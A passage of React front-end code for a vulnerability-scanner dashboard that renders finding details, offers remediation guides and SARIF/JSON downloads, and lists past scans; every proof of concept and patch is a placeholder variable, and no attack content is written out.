                          `# Remediation Guide: ${selectedVuln.title}\n\n## Vulnerability Details\n- Severity: ${selectedVuln.severity.toUpperCase()} (CVSS ${selectedVuln.cvss})\n- Type: ${selectedVuln.type}\n- Endpoint: ${selectedVuln.endpoint}\n\n## Description\n${selectedVuln.description}\n\n## Verified Proof of Concept\n\`\`\`\n${selectedVuln.poc}\n\`\`\`\n\n## Step-by-Step Fix Procedure\n${selectedVuln.fix || selectedVuln.remediation}\n\n## Surgical Code Patch\n\`\`\`diff\n${selectedVuln.patch}\n\`\`\`\n`,
                          'text/markdown'
                        )}
                      >
                        <DownloadIcon size={14} /> Guide <code>.md</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFile(
                          `redsuture-${selectedVuln.id}.sarif`,
                          JSON.stringify({
                            version: '2.1.0',
                            $schema: 'https://raw.githubusercontent.com/oasis-tcs/sarif-spec/master/Schemata/sarif-schema-2.1.0.json',
                            runs: [{
                              tool: { driver: { name: 'RedSuture Autonomous AI Security', version: '2.4.0' } },
                              results: [{
                                ruleId: selectedVuln.id,
                                message: { text: selectedVuln.title },
                                properties: { cvss: selectedVuln.cvss, severity: selectedVuln.severity, remediation: selectedVuln.fix || selectedVuln.remediation }
                              }]
                            }]
                          }, null, 2),
                          'application/json'
                        )}
                      >
                        <DownloadIcon size={14} /> SARIF <code>.sarif</code>
                      </button>
                      <button
                        className={styles.downloadBtn}
                        onClick={() => downloadFile(`audit-report-${selectedVuln.id}.json`, JSON.stringify(selectedVuln, null, 2), 'application/json')}
                      >
                        <DownloadIcon size={14} /> Report <code>.json</code>
                      </button>
                    </div>
                  </div>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>Proof of concept (sandbox verified)</h3>
                    <pre className={styles.codeBlock}><code>{selectedVuln.poc}</code></pre>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>Impact &amp; root cause analysis</h3>
                    <p className={styles.vulnDesc}>{selectedVuln.description}</p>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>Step-by-step remediation procedure</h3>
                    <ol className={styles.fixSteps}>
                      {(selectedVuln.fix || selectedVuln.remediation || '').split('\n').map((step, idx) => (
                        <li key={idx}>{step.replace(/^\d+\.\s*/, '')}</li>
                      ))}
                    </ol>
                  </section>

                  <section className={styles.vulnSection}>
                    <h3 className={styles.vulnSectionTitle}>Surgical code patch</h3>
                    <pre className={`${styles.codeBlock} ${styles.diff}`}>
                      {selectedVuln.patch.split('\n').map((line, idx) => (
                        <span key={idx} className={diffLineClass(line)}>{line || ' '}{'\n'}</span>
                      ))}
                    </pre>
                  </section>

                  <footer className={styles.vulnActions}>
                    <button
                      className="btn-primary"
                      onClick={() => {
                        navigator.clipboard?.writeText(selectedVuln.patch);
                        showToast('Code patch copied to clipboard');
                      }}
                    >
                      <CopyIcon size={14} /> Copy patch
                    </button>
                    <button
                      className="btn-secondary"
                      onClick={() => {
                        navigator.clipboard?.writeText(`${selectedVuln.title}\n\nDescription:\n${selectedVuln.description}\n\nRemediation Steps:\n${selectedVuln.fix || selectedVuln.remediation}`);
                        showToast('Remediation guide copied');
                      }}
                    >
                      Copy guide
                    </button>
                  </footer>
                </article>
              </div>
            </div>
          )}

          {/* HISTORY TAB */}
          {activeTab === 'history' && (
            <section className={styles.panel}>
              <div className={styles.panelHeader}>
                <h2 className={styles.panelTitle}>Past scan executions</h2>
                <button className="btn-secondary" onClick={() => downloadFile('all-scans-summary.json', JSON.stringify(scansList, null, 2), 'application/json')}>
                  <DownloadIcon size={14} /> Download all history
                </button>
              </div>
              <div className={styles.tableWrap}>
                <table className={styles.table}>
                  <thead>
                    <tr>
                      <th>Target</th>
                      <th>Date</th>
                      <th>Duration</th>
                      <th>Verified Findings</th>
                      <th>Security Score</th>
                      <th><span className={styles.srOnly}>Actions</span></th>
                    </tr>
                  </thead>
                  <tbody>
                    {scansList.map(scan => (
                      <tr key={scan.id} onClick={() => goToFindings(scan)}>
                        <td>
                          <span className={styles.tableTarget}>{scan.target}</span>
                          <span className={styles.tableSub}>{scan.targetType}</span>
                        </td>
                        <td className={styles.tableMuted}>{scan.date}</td>
                        <td className={styles.tableMuted}>{scan.duration}</td>
                        <td>
                          <span className={styles.scanBadges}>
                            <SeverityPill level="critical" count={scan.critical} />
                            <SeverityPill level="high" count={scan.high} />
                          </span>
                        </td>
                        <td><span className={`${styles.tableScore} ${scoreClass(scan.score)}`}>{scan.score}</span></td>
                        <td className={styles.tableAction}>
                          <button className="btn-ghost" onClick={e => { e.stopPropagation(); goToFindings(scan); }}>
                            View findings <ChevronRightIcon size={14} />
                          </button>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>
            </section>
          )}
        </div>
      </main>
    </div>
  );
}
